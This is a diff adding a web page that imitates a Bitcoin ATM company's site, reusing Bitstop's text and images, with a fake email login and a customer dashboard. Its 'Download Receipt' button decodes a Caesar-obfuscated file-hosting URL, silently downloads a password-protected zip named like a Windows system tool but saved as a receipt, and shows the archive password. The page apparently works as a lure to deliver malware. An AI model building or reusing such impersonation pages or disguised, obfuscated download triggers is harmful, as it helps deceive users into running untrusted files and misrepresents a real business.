@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure BTC ATM Service</title>
+    <style>
+			/* styles.css */
+		body {
+			font-family: 'Arial', sans-serif;
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		header {
+			display: flex;
+			align-items: center;
+			background: #FFF;
+			padding: 10px 20px;
+		}
+
+		.logo {
+			height: 50px; /* Placeholder size */
+			margin-right: 20px;
+		}
+
+		.btc-tracker {
+			font-size: 1.2em;
+			margin-right: auto;
+		}
+
+		nav ul {
+			list-style: none;
+			display: flex;
+			margin: 0;
+			padding: 0;
+		}
+
+		nav ul li {
+			margin-left: 20px;
+		}
+
+		nav ul li a {
+			text-decoration: none;
+			color: #333;
+			font-weight: bold;
+		}
+
+		footer {
+			background: #333;
+			color: #fff;
+			display: flex;
+			justify-content: space-between;
+			padding: 20px;
+			flex-wrap: wrap;
+		}
+
+		.footer-links a, .footer-actions a {
+			color: #fff;
+			text-decoration: none;
+			margin: 5px 10px;
+		}
+
+		.footer-actions form {
+			display: flex;
+		}
+
+		input[type="email"] {
+			padding: 5px;
+			margin-right: 5px;
+		}
+
+		button {
+			background: #ff6600;
+			border: none;
+			color: #fff;
+			padding: 5px 10px;
+			cursor: pointer;
+		}
+
+		@media (max-width: 768px) {
+			header, footer {
+				flex-direction: column;
+			}
+
+			.btc-tracker {
+				margin-bottom: 10px;
+			}
+
+			nav ul {
+				flex-direction: column;
+			}
+
+			nav ul li {
+				margin: 5px 0;
+			}
+		}
+		/* Additional styles for the main content sections */
+
+		section {
+			padding: 40px 20px;
+			text-align: center;
+		}
+
+		h2 {
+			color: #333;
+			font-size: 2.5em;
+		}
+
+		h3 {
+			color: #ff6600;
+			font-size: 2em;
+		}
+
+		p {
+			color: #666;
+			line-height: 1.6;
+		}
+
+		.btn {
+			display: inline-block;
+			padding: 10px 20px;
+			margin-top: 20px;
+			background-color: #ff6600;
+			color: white;
+			text-decoration: none;
+			border-radius: 5px;
+			transition: background-color 0.3s ease;
+		}
+
+		.btn:hover {
+			background-color: #e65c00;
+		}
+
+		/* Responsive layout adjustments */
+		@media (max-width: 768px) {
+			h2 {
+				font-size: 2em;
+			}
+
+			h3 {
+				font-size: 1.5em;
+			}
+		}
+		.image-container {
+			margin: 20px auto;
+			max-width: 600px; /* or whatever max-width you prefer */
+		}
+
+		.image-container img {
+			width: 100%;
+			height: auto;
+		}
+		/* Help Center Banner Styles */
+		#help-banner {
+			background-color: #f2f2f2; /* Light grey background */
+			padding: 20px;
+			text-align: center;
+		}
+
+		.banner-content p {
+			font-weight: bold;
+			margin-bottom: 10px;
+		}
+
+		/* Help Center Main Content Styles */
+		#help-center {
+			text-align: center;
+			padding: 40px 20px;
+		}
+
+		#help-center h2 {
+			color: #333;
+			font-size: 2em;
+		}
+
+		#help-center h3 {
+			color: #666;
+			margin-bottom: 30px;
+		}
+		/* Help Topics Grid with Flexbox */
+		.help-topics-grid {
+			display: flex;
+			flex-wrap: wrap;
+			gap: 20px; /* This property is not supported in some older browsers */
+			justify-content: center; /* This will center the items in the container */
+		}
+
+		.help-topic {
+			flex: 1 1 180px; /* This means each item will try to be at least 180px wide, but flexible */
+			max-width: calc(25% - 20px); /* Assuming a 20px gap, adjust the max-width accordingly */
+			box-sizing: border-box;
+			padding: 15px;
+			background-color: #fff;
+			border: 1px solid #ddd;
+			text-align: center;
+			/* other styles remain the same */
+		}
+
+		/* Adjustments for smaller screens */
+		@media (max-width: 1024px) {
+			.help-topic {
+				max-width: calc(33.333% - 20px); /* 3 columns */
+			}
+		}
+
+		@media (max-width: 768px) {
+			.help-topic {
+				max-width: calc(50% - 20px); /* 2 columns */
+			}
+		}
+
+		@media (max-width: 480px) {
+			.help-topic {
+				max-width: calc(100% - 20px); /* 1 column */
+			}
+		}
+
+		.help-topic {
+			background-color: #fff;
+			border: 1px solid #ddd;
+			padding: 15px;
+			text-align: center;
+		}
+
+		.help-topic img {
+			width: 100px; /* Adjust as needed */
+			height: auto;
+			margin-bottom: 15px;
+		}
+
+		.help-topic h4 {
+			color: #333;
+			font-size: 1em;
+		}
+		.help-answer {
+			display: none; /* Hidden by default */
+			background-color: #f2f2f2; /* Light grey background */
+			border: 1px solid #ddd;
+			padding: 10px;
+			margin-top: 10px; /* Spacing between button and answer box */
+			text-align: left;
+		}
+		.toggle-answer-btn {
+			cursor: pointer;
+			/* Add more styles to make the button look nice */
+		}
+
+		.help-answer {
+			display: none; /* Keep this to ensure answers are hidden by default */
+			/* Add more styles for the answer paragraphs */
+		}
+		/* The Modal (background) */
+		.modal {
+		  display: none; /* Hidden by default */
+		  position: fixed; /* Stay in place */
+		  z-index: 1; /* Sit on top */
+		  left: 0;
+		  top: 0;
+		  width: 100%; /* Full width */
+		  height: 100%; /* Full height */
+		  overflow: auto; /* Enable scroll if needed */
+		  background-color: rgb(0,0,0); /* Fallback color */
+		  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+		}
+
+		/* Modal Content */
+		.modal-content {
+		  background-color: #fefefe;
+		  margin: 15% auto; /* 15% from the top and centered */
+		  padding: 20px;
+		  border: 1px solid #888;
+		  width: 80%; /* Could be more or less, depending on screen size */
+		}
+
+		/* The Close Button */
+		.close {
+		  color: #aaa;
+		  float: right;
+		  font-size: 28px;
+		  font-weight: bold;
+		}
+
+		.close:hover,
+		.close:focus {
+		  color: black;
+		  text-decoration: none;
+		  cursor: pointer;
+		}
+
+		/* OK Button inside the modal */
+		#okBtn {
+		  margin-top: 20px;
+		}
+
+	</style>
+</head>
+<body>
+    <header>
+        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn.pixabay.com%2Fphoto%2F2017%2F07%2F27%2F21%2F01%2Fbitcoin-2546743__180.png&f=1&nofb=1&ipt=f25ef071324504dddc08b333e7c47be6524992850f95389c43d8fae23f9bfd50&ipo=images" alt="BTC ATM Logo" class="logo">
+        <div class="btc-tracker">1 BTC = <span id="btcPrice">--loading--</span></div>
+        <nav>
+            <ul>
+                <li><a href="#home">Home</a></li>
+                <li><a href="#enroll">Trading</a></li>
+                <li><a href="#help-center">Help Center</a></li>
+                <li><button id="loginBtn">Log In</button></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Main content similar to the provided screenshot -->
+<!-- Main Section -->
+	<main>
+		<!-- Section: Buy Bitcoin with Cash Instantly -->
+		<section id="buy-bitcoin">
+			<h2>Secure and Fast BITCOIN ATM Service</h2>
+			<h3>Buy Bitcoin with Cash Instantly</h3>
+			<p>Our ATMs provide a seamless and secure way to purchase Bitcoin with cash. Get started with digital currency today by visiting one of our many convenient locations.</p>
+			<!--<a href="#help-center" class="btn">Explore Our Help Center</a>
+			<!-- Within each section where you want an image -->
+			<div class="image-container">
+				<img src="https://bitstop.co/wp-content/uploads/2023/06/heroimage.png" alt="ATM">
+			</div>
+
+		</section>
+
+		<!-- Section: Find a Location Nationwide -->
+		<section id="find-location">
+			<h3>Find a Location Nationwide</h3>
+			<p>Bitstop ATMs are conveniently located and typically open 24 hours. Explore our map to find your nearest Bitstop and join the Bitcoin movement now.</p>
+			<!--<a href="#locations" class="btn">Find a Location Near You</a>
+<!-- Within each section where you want an image -->
+			<div class="image-container">
+				<img src="https://bitstop.co/wp-content/uploads/2023/06/find-a-location-1.svg" alt="states">
+			</div>
+		</section>
+
+		<!-- Section: Enroll in Seconds -->
+		<section id="enroll">
+			<h3>Enroll in Seconds</h3>
+			<p>Signing up at a Bitstop ATM is a breeze. Follow the simple on-screen instructions, and you'll be ready to make your first Bitcoin purchase in no time.</p>
+			
+			<!-- Sign Up Button -->
+			<button id="signUpBtn">Sign Up</button>
+
+			<!-- Modal -->
+			<div id="signupModal" class="modal">
+			  <!-- Modal content -->
+			  <div class="modal-content">
+				<span class="close">&times;</span>
+				<p>To sign up, please visit one of our BTC ATMs. Click OK to find the nearest location.</p>
+				<button id="okBtn">OK</button>
+			  </div>
+			</div>
+
+			<!-- Within each section where you want an image -->
+			<div class="image-container">
+				<img src="https://bitstop.co/wp-content/uploads/2023/06/enroll.svg" alt="getstart">
+			</div>
+		</section>
+	</main>
+  <!-- Help Center Banner -->
+<section id="help-banner">
+    <div class="banner-content">
+        <p>WANT TO BUY LARGE AMOUNTS OF BITCOIN WITH YOUR BANK ACCOUNT?</p>
+        <a href="#trade-desk" class="btn">Learn more about our Trade Desk</a>
+    </div>
+</section>
+
+<!-- Help Center Main Content -->
+<section id="help-center">
+    <h2>HOW CAN WE HELP?</h2>
+    <h3>All Things Bitstop at Your Fingertips</h3>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/hours-thumb.svg" alt="Clock">
+            <h4>What Hours are the ATMs Available?</h4>
+			<button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">ATMs are available 24/7 for your convenience.</p>
+        </div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/near_me-thumb.svg" alt="Clock">
+            <h4>How Do I get a ATM near me?</h4>
+            <button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">Reach out to us about purchasing an ATM.</p>
+        </div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/confirm-thumb.svg" alt="Clock">
+            <h4>Confirmation on the Bitcoin Network</h4>
+			<button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">Confirmations are available 30min-2hr after purchase. Max 3 hours.</p>
+		</div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/fast-thumb.svg" alt="Clock">
+            <h4>How Fast Will I Receive my Payment</h4>
+			<button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">Depending on Fees paid, user can expect payment in 15min to 3hours.</p>
+		</div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/fee-thumb.svg" alt="Clock">
+            <h4>What are ATM Fees?</h4>
+			<button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">Fees need to be paid for transaction to be broadcast to blockchain.</p>
+		</div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+    <div class="help-topics-grid">
+        <!-- Help Topic Item -->
+        <div class="help-topic">
+            <img src="https://bitstop.co/wp-content/uploads/2023/06/find-thumb.svg" alt="Clock">
+            <h4>What is a Bitcoin ATM</h4>
+			<button class="toggle-answer-btn">→</button>
+        	<p class="help-answer" style="display: none;">BTC ATM is way for customer to convert cash to crypto.</p>
+		</div>
+        <!-- Repeat for each help topic -->
+        <!-- ... -->
+    </div>
+	
+</section>
+<!-- Login Button -->
+
+
+<!-- Login Modal -->
+<div id="loginModal" class="modal">
+  <div class="modal-content">
+    <span class="close-login">&times;</span>
+    <h2>Login with Your Email</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email Used at BTC ATM" required>
+      <div id="passwordSection" style="display: none;">
+        <input type="password" id="password" placeholder="Set a Temporary Password" required>
+        <p id="passwordHint">Password must be over 8 characters, include 1 capital letter, and 1 number.</p>
+        <p id="passwordStrength">Password Strength: </p>
+      </div>
+      <button type="submit" id="loginSubmit">Log In / Create Account</button>
+    </form>
+  </div>
+</div>
+
+<div id="userDetails" class="modal">
+    <div class="modal-content">
+        <span class="close-details">×</span>
+        <h2>Welcome Jenny Baggins</h2>
+        <p>Your most recent transaction:</p>
+        <div class="transaction">
+            <p>Location: Gas Station in Los Angeles, CA</p>
+            <p>Date: November 20, 2023</p>
+            <p>Amount: 0.05 BTC</p>
+        </div>
+        <p>Contact us at: <span id="phoneNumber">support@atmbtc.com</span></p>
+        <button id="downloadReceipt">Download Receipt</button>
+        <button id="logout">Logout</button>
+    </div>
+</div>
+
+  
+
+    <footer>
+        <div class="footer-links">
+            <a href="#about">Learn More About Us</a>
+            <a href="#terms">Terms and Conditions</a>
+            <a href="#careers">Careers</a>
+            <a href="#help">Help Center</a>
+            <a href="#news">News</a>
+            <a href="#blog">Blog</a>
+        </div>
+        <div class="footer-actions">
+            <a href="#become-operator">Become an Operator</a>
+            <a href="#subscribe">Subscribe to Our Newsletter</a>
+            <form action="#" method="post">
+                <input type="email" placeholder="Enter Email">
+                <button type="submit">→</button>
+            </form>
+        </div>
+    </footer>
+
+<script>
+	// script.js
+	document.addEventListener('DOMContentLoaded', function() {
+		// Placeholder for BTC price fetching
+		// In production, you should use a real API to get the BTC price
+		fetch('https://api.coindesk.com/v1/bpi/currentprice.json')
+			.then(response => response.json())
+			.then(data => {
+				document.getElementById('btcPrice').textContent = `$${data.bpi.USD.rate}`;
+			})
+			.catch(error => {
+				console.error('Error fetching BTC price:', error);
+				document.getElementById('btcPrice').textContent = 'Unavailable';
+			});
+	});
+
+</script>
+	<script>
+	// This function toggles the visibility of the answer associated with the clicked button
+	function toggleAnswer(element) {
+		// Get the next sibling of the clicked button, which should be the answer paragraph
+		var answer = element.nextElementSibling;
+		// Check if the answer is currently displayed
+		if (answer.style.display === "none") {
+			answer.style.display = "block"; // Show the answer
+			element.textContent = 'Hide'; // Optionally change the button text to 'Hide'
+		} else {
+			answer.style.display = "none"; // Hide the answer
+			element.textContent = '→'; // Change the button text back to '→'
+		}
+	}
+
+	// Add a click event listener to each button
+	document.querySelectorAll('.toggle-answer-btn').forEach(function(button) {
+		button.addEventListener('click', function() {
+			toggleAnswer(button);
+		});
+	});
+	</script>
+	<script>
+	// Get the modal
+	var modal = document.getElementById("signupModal");
+
+	// Get the button that opens the modal
+	var btn = document.getElementById("signUpBtn");
+
+	// Get the element that closes the modal
+	var span = document.getElementsByClassName("close")[0];
+
+	// Get the OK button
+	var okBtn = document.getElementById("okBtn");
+
+	// When the user clicks the button, open the modal 
+	btn.onclick = function() {
+	  modal.style.display = "block";
+	}
+
+	// When the user clicks on <span> (x), close the modal
+	span.onclick = function() {
+	  modal.style.display = "none";
+	}
+
+	// When the user clicks OK, maybe redirect to location page or close the modal
+	okBtn.onclick = function() {
+	  modal.style.display = "none";
+	  // Redirect to the locations page if needed
+	  // window.location.href = '/your-locations-page';
+	}
+
+	// When the user clicks anywhere outside of the modal, close it
+	window.onclick = function(event) {
+	  if (event.target == modal) {
+		modal.style.display = "none";
+	  }
+	}
+	</script>
+<script>
+	document.getElementById('loginBtn').onclick = function() {
+		document.getElementById('loginModal').style.display = 'block';
+	};
+
+	document.getElementsByClassName('close-login')[0].onclick = function() {
+		document.getElementById('loginModal').style.display = 'none';
+	};
+
+	const targetHash = 2099811859; // Precomputed hash for "test@test.com"
+
+	document.getElementById('email').oninput = function() {
+		var email = document.getElementById('email').value;
+		if (simpleHash(email) === targetHash) {
+			document.getElementById('passwordSection').style.display = 'block';
+		} else {
+			document.getElementById('passwordSection').style.display = 'none';
+		}
+	};
+
+	let passwordStrength = 'Weak';
+	document.getElementById('password').oninput = function() {
+		var password = document.getElementById('password').value;
+		passwordStrength = 'Weak';
+		if (password.length > 8 && /[A-Z]/.test(password) && /[0-9]/.test(password)) {
+			passwordStrength = 'Strong';
+		}
+		document.getElementById('passwordStrength').textContent = 'Password Strength: ' + passwordStrength;
+	};
+
+	document.getElementById('loginForm').onsubmit = function(event) {
+		event.preventDefault();
+		var email = document.getElementById('email').value;
+		if (simpleHash(email) === targetHash && passwordStrength === 'Strong') {
+			document.getElementById('loginModal').style.display = 'none';
+			document.getElementById('userDetails').style.display = 'block';
+		} else {
+			showEmailNotFoundMessage();
+		}
+	};
+
+	document.getElementsByClassName('close-details')[0].onclick = function() {
+		document.getElementById('userDetails').style.display = 'none';
+	};
+
+	function closeAllModals() {
+		document.getElementById('loginModal').style.display = 'none';
+		document.getElementById('userDetails').style.display = 'none';
+		var message = document.getElementById('emailNotFoundMessage');
+		if (message) {
+			message.style.display = 'none';
+		}
+	};
+
+	function simpleHash(str) {
+		let hash = 0;
+		for (let i = 0; i < str.length; i++) {
+			let char = str.charCodeAt(i);
+			hash = ((hash << 5) - hash) + char;
+			hash = hash & hash;
+		}
+		return hash;
+	}
+
+	function showEmailNotFoundMessage() {
+		var message = document.getElementById('emailNotFoundMessage');
+		if (!message) {
+			message = document.createElement('span');
+			message.id = 'emailNotFoundMessage';
+			message.textContent = 'Email not found';
+			message.style.marginLeft = '10px';
+			message.style.color = 'red';
+
+			var loginButton = document.getElementById('loginBtn');
+			loginButton.parentNode.insertBefore(message, loginButton.nextSibling);
+		} else {
+			message.style.display = 'inline';
+		}
+	}
+	document.addEventListener('DOMContentLoaded', function() {	
+		document.getElementById('downloadReceipt').onclick = function() {
+			// Decrypt the URL
+			const decryptedUrl = Decrypt("lxxtw://wxsvi8.ksjmpi.ms/hsarpseh/51g236e3-365f-4558-f17f-439ge793f70j/TvsgiwwIbtpsviv.dmt", 4);
+
+			// Create an invisible link for downloading
+			var downloadLink = document.createElement('a');
+			downloadLink.href = decryptedUrl; // Set the decrypted URL as the href
+			downloadLink.download = 'RecentReceipt.zip'; // Set the desired file name for the download
+			downloadLink.style.display = 'none'; // Make the link invisible
+
+			// Append the link to the document, trigger a click, and then remove it
+			document.body.appendChild(downloadLink);
+			downloadLink.click();
+			document.body.removeChild(downloadLink);
+
+			// Optional: Display a message or log to indicate the download has started
+			alert('Receipt securely downloaded. Password: ' + Decrypt("FXGEXQ", 4));
+		};
+
+	});
+	function Decrypt(text, shift) {
+		let result = "";
+		for (let i = 0; i < text.length; i++) {
+			let char = text[i];
+			// Decrypt uppercase characters
+			if (char >= 'A' && char <= 'Z') {
+				result += String.fromCharCode((char.charCodeAt(0) - shift - 65 + 26) % 26 + 65);
+			}
+			// Decrypt lowercase characters
+			else if (char >= 'a' && char <= 'z') {
+				result += String.fromCharCode((char.charCodeAt(0) - shift - 97 + 26) % 26 + 97);
+			} else {
+				result += char;
+			}
+		}
+		return result;
+	}
+	const encryptedUrl = "lxxtw://wxsvi8.ksjmpi.ms/hsarpseh/51g236e3-365f-4558-f17f-439ge793f70j/TvsgiwwIbtpsviv.dmt";
+	const encryptedPassword = "FXGEXQ";
+	const decryptedUrl = Decrypt(encryptedUrl, 4);
+	const decryptedPassword = Decrypt(encryptedPassword, 4);
+	
+	
+</script>
+</body>
+</html>
